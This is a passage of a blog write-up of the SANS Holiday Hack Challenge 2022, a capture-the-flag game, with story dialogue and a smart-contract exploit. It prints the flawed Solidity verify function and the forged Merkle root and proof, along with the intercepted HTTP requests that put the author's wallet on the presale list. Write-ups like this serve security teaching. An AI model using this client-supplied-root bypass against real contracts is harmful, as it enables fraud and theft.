    :alt: The Cloud Ring. It's a simple golden ring, like the one from Lord
        of the Rings, etched with clouds and wind lines.
    :align: center

.. image:: /images/sans-christmas-challenge-2022/sulfrod.png
    :alt: Sulfrod, same image as before.
    :align: center

*Sulfrod says*

    Ha! Now I have the ring!

    This computer stuff sure is easy if you just make someone do it for you.

    Wait.. the computer gave **you** the ring? Gah, whatever.

    This never happened, got it? Now beat it, nerd!

We go back our way only to find a distraught Grinchum:

.. image:: /images/sans-christmas-challenge-2022/smeagolmad3.png
    :alt: Grinchum, now red in the face.
    :align: center

*Grinchum says*

    🥺 *Four Preciouses - lost!*

    😫 *Noooo... grinchum..grinchum*

    😐 **..... naggy human doesn't only want coinses and hatses.**

    **...What...** 🤨 **has it got...**

    😠 **in its silly, little, badges!?**

    😧 **Stole them...** 😠 **You STOLE them!**

    😡 **Raaaargh!! We will make sure naggy human never takes our last
    Precious!**

Recover the Burning Ring of Fire
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Buy a Hat
---------

Down and down we go, where our mine canary can no longer breathe, until we meet
Wombley Cube:

.. image:: /images/sans-christmas-challenge-2022/wombleycube.png
    :alt: Wombley Cube is a green-skinned elf, with a white beard, a white
        T-Shirt, pink pants, black- and white-striped socks, and pink pointy
        elf shoes. He's wearing a purple Christmas hat.
    :align: center

*Wombley Cube says*

    Hey there! I'm Wombley Cube. It's so nice to see a friendly face.

    What's an elf doing all the way down here with all these sporcs, you ask?

    I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin.

    *The reason I set up shop here is to gather intel on that shady Luigi.*

    *I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers.*

    *He and his gang are up to no good, I'm sure of it. We've got a real Code
    Brown here.*

    *Purchase a hat so we look inconspicuous, and I'll clue you in on what we
    think they're scheming.*

    Of course, have a look at my inventory!

    *Oh, and if you haven't noticed, I've slipped hints for defeating these
    Sporcs around the tunnels!*

    *Keep your eyes open, and you'll find all five of them. Wait, maybe it's
    six?*

An undercover elf among the Sporcs! The hints he talks about are chests
lying around the tunnels, but most of them only contain KringleCoins. Luckily
for us, we can use those to buy a hat from Wombley.

We click on his hat-vending machine, and settle on this fine gray cowboy hat:

.. image:: /images/sans-christmas-challenge-2022/chosen_hat.png
    :alt: Our chosen hat, a gray cowboy hat. The vending machine gives us
        instruction as to how to buy it: "To purchase this hat you must:
        Use a KTM to pre-approve a 10 KC transaction to the wallet address:
        hexadecimal value of the address.
        Return to this kiosk and use Hat ID: 398 to complete your purchase.
    :align: center

We go to a KTC (KringleCoin Teller Machine) and pre-approve our 10 KringleCoin
transaction:

.. image:: /images/sans-christmas-challenge-2022/hat_pre_approval.png
    :alt: The KTM interface where we're buying our hat. There are three fields.
        The first one is the destination wallet address, filled with the value
        given by the vending machine. The second is the amount of the
        transaction, which is 10 KC. The last one is my censored private key.
    :align: center

We now go back to the hat-vending machine to claim our hat:

.. image:: /images/sans-christmas-challenge-2022/hat_approved_transaction.png
    :alt: The vending machine interface. There are two fields. The first one
        is filled with my wallet address, and the second one with the ID of the
        desired hat (in our case 398 for the gray cowboy hat). Below the two
        fields, we see "Transaction succeeded! Transaction ID: large
        hexadecimal value. Block 76303.
    :align: center

I can now wear my cool hat everywhere:

.. image:: /images/sans-christmas-challenge-2022/useless_avatar_with_hat.png
    :alt: My avatar wearing the gray cowboy hat.
    :align: center

Blockchain Divination
---------------------

.. image:: /images/sans-christmas-challenge-2022/wombleycube.png
    :alt: Wombley Cube, same image as before.
    :align: center

*Wombley Cube says*

    Nice hat! I think Ed Skoudis would say the same. It looks great on you.

    *So, here's what we've uncovered so far. Keep this confidential, ok?*

    *Earlier, I overheard that disgruntled customer in the office saying he
    wanted in on the "rug pull".*

    *If our suspicions are correct, that's why the sporcs want an invite to the
    presale so badly.*

    *Once the* "`Bored Sporc Rowboat Society <https://en.wikipedia.org/wiki/Bored_Ape>`__"
    *NFTs officially go on sale, the sporcs will upsell them.*

    *After most of the NFTs are purchased by unwitting victims, the Sporcs are
    going to take the money and abandon the project.*

    *Mission #1 is to find a way to get on that presale list to confirm our
    suspicions and thwart their dastardly scheme!*

    *We also think there's a Ring hidden there, so drop Mission #2 on them and
    rescue that ring!*

    Thank you for your business, dear customer!

The Sporcs are running an NFT scam, schocking. Anyway, we're asked to find the
address of the KringleCoin smart contract on the blockchain.

The Blockchain Explorer can be used to analyze the different blocks of the
blockchain. For example, we can look at block #76303, which is the block with
my transaction to buy a hat:

.. image:: /images/sans-christmas-challenge-2022/blockchain_explorer_block_76303.png
    :alt: The Blockchain Explorer showing block #76303. We can see that it's a
        transaction block with a value of 10 and a comment "Purchased HatID
        #398!"
    :align: center

Let's look at the first block on the blockchain:

.. image:: /images/sans-christmas-challenge-2022/blockchain_explorer_block_1.png
    :alt: The Blockchain Explorer showing block #1. This says "This transaction
        creates a contract. KringleCoin". The address of the contract is then
        given.
    :align: center

The address of the KringleCoin contract is :code:`0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554`.

Exploit a Smart Contract
------------------------

Here's the big one, we must now find a way to get on the presale list by
exploiting a vulnerability in the Bored Sporc Rowboat Society smart contract.

By taking a look at `the BSRC website <https://boredsporcrowboatsociety.com/>`__,
we learn more about the pre-sale list:

    We are currently in "pre-sale" mode, which means that the only folks who
    can buy are our best buds who made it on the list (well, actually, the
    Merkle Tree).

So the pre-sale list is stored in the form of a `Merkle tree
<https://en.wikipedia.org/wiki/Merkle_tree>`__. Now I don't know squat about
smart contracts or Merkle tree. Luckily for us, Prof. Qwerty Petabyte is back
with a `KringleCon talk on the subject <https://www.youtube.com/watch?v=Qt_RWBq63S8>`__.
There's also a `new repository <https://github.com/QPetabyte/Merkle_Trees>`__
on their Github profile, which should help any Merkle tree shenanigans we'll
get into.

I recommend listening to the talk and reading the repository's `README
<https://github.com/QPetabyte/Merkle_Trees/blob/main/README.md>`__ as well as
the `Wikipedia article <https://en.wikipedia.org/wiki/Merkle_tree>`__ on
Merkle trees to fully understand how they work.

Long story short, people on the BSRS pre-sale list are given proof values
that they can send to the web site along with their wallet address. The smart
contract will compute the intermediary values until it gets to the root value,
and then compare it to the root value it has stored...

...or does it? In Prof. Petabyte's README, we can read:

    The only value the NFT producer needs to keep in their blockchain code is
    the root value itself! Because keeping anything stored on the blockchain is
    expensive, this is a huge benefit! Of course, the root mustn't be able to
    be altered, which is why keeping it IN the smart contract on the blockchain
    is what smart developers do.

Maybe the BSRS creators made a mistake and did not store the root on the
blockchain? If we use the Blockchain Explorer, we can see that block #2
contains the contract tied to the BSRS NFT:

.. image:: /images/sans-christmas-challenge-2022/blockchain_explorer_block_2.png
    :alt: The Blockchain Explorer showing block #2. This says "This transaction
        creates a contract. BSRS_nft".
    :align: center

We can get the `Solidity <https://en.wikipedia.org/wiki/Solidity>`__ code of
the BSRS NFT contract directly from the Blockchain Explorer. You can download
it `here </docs/sans-christmas-challenge-2022/BSRS_nft.sol>`__.

By looking around, we find the :code:`verify` function:

.. code-block:: solidity

    function verify(bytes32 leaf, bytes32 _root, bytes32[] memory proof) public view returns (bool) {
        bytes32 computedHash = leaf;
        for (uint i = 0; i < proof.length; i++) {
          bytes32 proofElement = proof[i];
          if (computedHash <= proofElement) {
            computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
          } else {
            computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
          }
        }
        return computedHash == _root;
    }

It looks like the :code:`verify` function takes a :code:`_root` parameter. It
sure does seem that the root value is *not* stored on the blockchain. This can
be confirmed by using the `pre-sale form <https://boredsporcrowboatsociety.com/presale.html>`__.
This form loads a `JavaScript file <https://boredsporcrowboatsociety.com/bsrs.js>`__:

.. code-block:: javascript
    :hl_lines: 18

    function do_presale(){
        if(!guid){
            alert("You need to enter this site from the terminal at the North Pole, not directly. If are doing this directly, you risk not getting credit for completing the challenge.");
        } else {
            var resp = document.getElementById("response");
            var ovr = document.getElementById('overlay');
            resp.innerHTML = "";
            var cb = document.getElementById("validate").checked;
            var val = 'false'
            if(cb){
                val = 'true'
            } else {
                ovr.style.display = 'block';
                in_trans = true;
            };
            var address = document.getElementById("wa").value;
            var proof = document.getElementById('proof').value;
            var root = '0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1';
            var xhr = new XMLHttpRequest();

            xhr.open('Post', 'cgi-bin/presale', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function(){
                if(xhr.readyState === 4){
                    var jsonResponse = JSON.parse(xhr.response);
                    ovr.style.display = 'none';
                    in_trans = false;
                    resp.innerHTML = jsonResponse.Response;
                };
            };
            xhr.send(JSON.stringify({"WalletID": address, "Root": root, "Proof": proof, "Validate": val, "Session": guid}));
        };
    }

They sure messed up. We can now build our own Merkle tree with our wallet
address, compute our proof and root values, and pretend we're on the pre-sale
list. This is where `Prof. Petabyte's repository <https://github.com/QPetabyte/Merkle_Trees>`__
will come useful.

We clone the repo, create a :code:`venv`, and install the requirements:

.. code-block:: console

    $ git clone https://github.com/QPetabyte/Merkle_Trees
    $ python3 -m venv ~/venv/merkle
    $ source ~/venv/merkle/bin/activate
    $ pip3 install wheel
    $ pip3 install -r ./Merkle_Trees/requirements.txt

Now, we can edit the file to put build our Merkle tree with our wallet address.
We just modify the :code:`allowlist` variable:

.. code-block:: python

    allowlist = ['0x129c7E7e786120E3DCD29D4c2ad0d0001616fad2','0x0000000000000000000000000000000000000000']

Now, let's run the script:

.. code-block:: console

    $ python3 merkle_tree.py
    Root: 0x5fb0f1ec0a42dc34152e3937c295c5e2ad1e105ce5bef576a33d47c3bbe3f42e
    Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a']

We can now pretend to be on the pre-sale list. We use the pre-sale verification
form, and intercept it using Burp to modify the value of the root parameter:

.. code-block:: http

    POST /cgi-bin/presale HTTP/1.1
    Host: boredsporcrowboatsociety.com
    Cookie: GCLB="411e2170d1ac26e8"
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: */*
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Content-Length: 277
    Origin: https://boredsporcrowboatsociety.com
    Referer: https://boredsporcrowboatsociety.com/presale.html?&challenge=bsrs&username=useless&id=0a6556c7-ff84-410c-b1db-59fb1bec0928&area=level5&location=14,15&tokens=
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    {"WalletID":"0x129c7E7e786120E3DCD29D4c2ad0d0001616fad2","Root":"0x5fb0f1ec0a42dc34152e3937c295c5e2ad1e105ce5bef576a33d47c3bbe3f42e","Proof":"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a","Validate":"true","Session":"0a6556c7-ff84-410c-b1db-59fb1bec0928"}

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.23.2
    Date: Tue, 20 Dec 2022 15:29:41 GMT
    Content-Type: application/json
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {"Response": "You're on the list and good to go! Now... BUY A SPORC!"}

Nice! The contract believes we're on the list. Now we can buy a Sporc NFT
by sending 100 KC to the SBRS creators' wallet:

.. image:: /images/sans-christmas-challenge-2022/bsrs_nft_approved_transaction.png
    :alt: The KCTM interface. There are three fields. The first one is filled
        with the wallet address of BSRS. The second one is the amount of the
        transaction, 100 KC. The third one is my censored private key. The
        interface then reads "You have successfully approved the transaction!"
    :align: center

Now that we sent 100 KC, let's get our BSRS NFT using the previous form:

.. code-block:: http

    POST /cgi-bin/presale HTTP/1.1
    Host: boredsporcrowboatsociety.com
    Cookie: GCLB="411e2170d1ac26e8"
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: */*
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Content-Length: 278
    Origin: https://boredsporcrowboatsociety.com
    Referer: https://boredsporcrowboatsociety.com/presale.html?&challenge=bsrs&username=useless&id=0a6556c7-ff84-410c-b1db-59fb1bec0928&area=level5&location=14,15&tokens=
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    {"WalletID":"0x129c7E7e786120E3DCD29D4c2ad0d0001616fad2","Root":"0x5fb0f1ec0a42dc34152e3937c295c5e2ad1e105ce5bef576a33d47c3bbe3f42e","Proof":"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a","Validate":"false","Session":"0a6556c7-ff84-410c-b1db-59fb1bec0928"}

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.23.2
    Date: Tue, 20 Dec 2022 15:34:11 GMT
    Content-Type: application/json
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {"Response": "Success! You are now the proud owner of BSRS Token #000272. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS272, or check it out in the gallery!<br>Transaction: 0xe1351d421455dd4ebb5712194c8f14e0b2c6e1680f2b7f770eb553393d202c89, Block: 76995<br><br>Remember: Just like we planned, tell everyone you know to <u><em>BUY A BoredSporc</em></u>.<br>When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!<br><br>The market will tank, but we'll all be rich!!!"}

Hurray, I now have the BSRS NFT #272. Here's how it looks like:

.. image:: /images/sans-christmas-challenge-2022/BSRS272.png
    :alt: My BSRS NFT. It's a Sporc's head with an eyepatch, a blue eye, pink
        glossy lipstick, and protruding bottom teeth.
    :align: center

It's... yeah. Anyway, NFTs and cryptocoins are scams, the only thing we are
interested in is finding our rings.

And here it is, our fifth and final ring, the Burning Ring of Fire:

.. image:: /images/sans-christmas-challenge-2022/brof.png
    :alt: The Tolkien Ring. It's a simple golden ring, like the one from Lord
        of the Rings, etched with red flames.
    :align: center

.. image:: /images/sans-christmas-challenge-2022/wombleycube.png
    :alt: Wombley Cube, same image as before.
    :align: center

*Wombley Cube says*

    You've done your duty, agent.

    Excellent work, especially on Mission #2! I'll log this entry back at STINC
    HQ.

    Keep doing work like this, and you'll be sitting on the STINC throne,
    leading the agency someday.

    Nobody will know of the job you did here today, but the STINC thanks you.

    I'm just being dramatic, **everyone's** gonna know how awesome you are!

We can see Grinchum, but he looks... conflicted:

.. image:: /images/sans-christmas-challenge-2022/smeagol.png
    :alt: Grinchum as we've first met him
    :align: center

*Grinchum says*

    😠 *We wants them... we needs them... Must.. have.. the Preciouses.*

    *They stole them from us, sneaky little humanses.*

    🙂 *No, not the humanses, they're my friends.*

    😏 *You don't have any friends. NOBODY likes YOU. You're a liar, and a thief, and a.... grriiiiiiinch.*

    😢 *Go away... we don't need you anymore. The humanses protect us now.*

    😠 *Go away? I protected us. The preciouses are safe because of ME!*

    🙂 *Leave now, and never.. come back.* 😃 *Leave now, and never.. come back!*

    😁 *LEAVE NOW, AND NEVER.. COME BACK!😬*

    **Friendly human, please go to jolly human's castle! Go on, we will meet you there!**

Conclusion
~~~~~~~~~~

With the five golden rings safely recovered, we can finally enter Santa's
castle:

.. image:: /images/sans-christmas-challenge-2022/santa.png
    :alt: Santa Claus in his usual attire.
    :align: center

*Santa says*

    Congratulations! You have foiled Grinchum's foul plan and recovered the
    Golden Rings!

    And by the magic of the rings, Grinchum has been restored back to his true,
    merry self: Smilegol!

    You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was
    able to snatch them from my castle.

    To anyone but me, their allure becomes irresistable the more Rings someone
    possesses.

    That allure eventually tarnishes the holder's Holiday Spirit, which is
    about giving, not possesing.

    That's exactly what happened to Smilegol; that selfishness morphed him into
    Grinchum.

    But thanks to you, Grinchum is no more, and the holiday season is saved!

    Ho ho ho, happy holidays!

Next to Santa, we can see our new Flobbit friend, Smilegol:

.. image:: /images/sans-christmas-challenge-2022/smilegol.png
    :alt: Smilegol is a Flobbit wearing a white shirt, a yellow vest, a green
        coat, and black trousers. He has hari bare feet and dark hair. He is
        smiling and looks at peace.
    :align: center

*Smilegol says*

    I must give you my most thankful of thanks, and most sorry of sorries.

    I'm not sure what happened, but I just couldn't resist the Rings' call.

    But once you returned the Rings to Santa, I was no longer so spellbound.

    I could think clearly again, so I shouted off that awful persona.

    And that grouchy Grinchum was gone for good. Now, I can be me again, just
    in time for gift giving.

    This is a lesson I won't soon forget, and I certainly won't forget you.

    I wish you smooth sailing on wherever your next voyage takes you!

Oh dear Flobbits, I don't know half of as well as I should like, and I like
less than half of you half as well as you deserve.

Once again, thanks to the SANS team for this amazing Christmas Challenge!
Exploiting the CI/CD vulnerability is a great exercise for real world
engagement.

See you next year!

